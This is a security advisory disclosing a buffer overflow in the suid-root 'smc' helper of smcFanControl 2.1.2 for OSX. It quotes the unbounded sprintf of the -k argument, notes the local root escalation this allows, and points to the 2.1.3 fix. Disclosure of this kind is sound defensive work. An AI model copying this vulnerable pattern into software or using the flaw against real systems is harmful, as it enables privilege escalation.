:Title: Buffer overflows in smcFanControl 2.1.2 for OSX
:Severity: Critical
:Reporter: KaiJern, Lau ( kjlau at vnsecurity.net)
:Products: smcFanControl 2.1.2
:OS: OSX
:Fixed in: to be release smcFanControl 2.1.3


About smcFanControl
--------------------

First of all, this is a very wonderul software and most of the macbook install
with this software. A big credit for the author Hendrik Holtmann.

Quote from the Official WebSite :

smcFanControl lets the user set the minimum speed of the build in fans.
So you can increase your minimum fan speed to make your intel mac run cooler.

However in order not to damage your machine scFanControl let's you not
set minimum
speed to a rate under Apple's defaults. In addition to that fans are
still in automatic
mode, so the speed of your fans will increase, if CPU load gets higher.


Description
-----------

First of all, let us look at
/Applications/smcFanControl.app/Contents/Resources/smc

Input option of smc -k was not able to handle large buffer. This will
end up with a buffer overflow bug.

Code from smc.c

-- snip snip --

int main(int argc, char *argv[])
{
    int c;
    extern char   *optarg;
    extern int    optind, optopt, opterr;

    kern_return_t result;
    int           op = OP_NONE;
    UInt32Char_t  key = "\0";
    SMCVal_t      val;

    while ((c = getopt(argc, argv, "fhk:lrw:v")) != -1)
    {
        switch(c)
        {
        case 'f':
            op = OP_READ_FAN;
            break;
        case 'k':
            sprintf(key, optarg); // Overflow !!!
            break;

-- snip snip --

$ ls -alF /Applications/smcFanControl.app/Contents/Resources/smc
-r-sr-sr-x  1 root  admin  18212 Jun 13  2007
/Applications/smcFanControl.app/Contents/Resources/smc*

With default installation, smc binary is always install with suid
root. There is a possibility
for a local user to gain root privilege.

It has not been verified if other version (version 1.x maybe) are also
vulnerable.

----------

Upgrade to latest version.

Fix
---

Hendrik Holtmann releasing smcFanControl 2.1.3.
